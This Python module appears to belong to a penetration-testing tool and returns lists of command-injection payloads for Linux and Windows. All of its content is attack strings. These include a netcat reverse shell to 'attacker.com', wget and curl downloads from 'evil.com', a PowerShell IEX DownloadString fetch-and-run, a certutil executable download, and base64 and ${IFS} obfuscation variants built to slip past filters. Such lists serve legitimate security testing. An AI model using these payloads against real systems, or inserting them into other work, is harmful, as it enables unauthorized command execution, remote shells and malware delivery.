# CMDi Payload Module
# Contributed by Unaiza - July 2025

def get_linux_basic_payloads():
    return [
        "; ls",
        "&& whoami",
        "| id",
        "`whoami`",
        "$(id)"
    ]

def get_linux_network_payloads():
    return [
        "; curl http://evil.com",
        "; wget http://evil.com -O /tmp/x",
        "; ping -c 4 attacker.com",
        "; nslookup attacker.com",
        "; dig attacker.com",
        "; nc -nv attacker.com 4444 -e /bin/sh",
        "; tcpdump -i eth0",
        "; ip a",
        "; ip route"
    ]

def get_linux_obfuscated_payloads():
    return [
        ";${IFS}whoami",
        "&&${IFS}id",
        "|${IFS}ls",
        "$(whoami)",
        "`id`",
        ";\\x77\\x68\\x6f\\x61\\x6d\\x69",
        ";echo$d2hvYW1p|base64${IFS}-d|bash",
        ";bash${IFS}-c${IFS}'whoami'",
        ";sh${IFS}-c${IFS}'id'",
        ";`curl${IFS}http://evil.com`",
        ";eval$(echo d2hvYW1p | base64 -d)",
        ";python3${IFS}-c${IFS}'__import__(\"os\").system(\"id\")'",
        ";perl${IFS}-e${IFS}'system(\"whoami\")'",
        ";php${IFS}-r${IFS}'system(\"ls\");'"
    ]

def get_windows_basic_payloads():
    return [
        "& whoami",
        "&& dir",
        "| net user",
        "%COMSPEC% /c whoami",
        "cmd /c dir"
    ]

def get_windows_powershell_payloads():
    return [
        "powershell -Command \"Get-Process\"",
        "powershell -c \"Invoke-WebRequest http://evil.com\"",
        "powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps')\"",
        "powershell -c \"(New-Object Net.Sockets.TCPClient('attacker.com',4444)).GetStream()\"",
        "certutil -urlcache -split -f http://evil.com/x.exe x.exe",
        "cmd /c start http://evil.com",
        "cmd /c \"ping -n 5 127.0.0.1\""
    ]

def get_all_payloads():
    """
    Returns all CMDi payloads: Linux (basic, network, obfuscated) and Windows (basic, PowerShell).
    """
    return (
        get_linux_basic_payloads()
        + get_linux_network_payloads()
        + get_linux_obfuscated_payloads()
        + get_windows_basic_payloads()
        + get_windows_powershell_payloads()
    )
